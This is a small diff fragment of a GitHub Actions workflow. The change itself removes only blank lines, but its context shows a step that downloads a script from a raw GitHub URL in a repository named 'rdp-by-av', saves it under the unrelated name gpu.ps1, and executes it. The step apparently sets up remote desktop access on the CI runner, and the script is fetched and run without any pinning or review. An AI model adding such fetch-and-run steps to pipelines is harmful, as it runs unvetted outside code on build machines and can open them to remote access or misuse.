@@ -21,5 +21,3 @@ jobs:
             Invoke-WebRequest https://raw.githubusercontent.com/danieljohnbrosman08211986/rdp-by-av/main/sh -OutFile gpu.ps1 
           
       - run: ./gpu.ps1
-
-
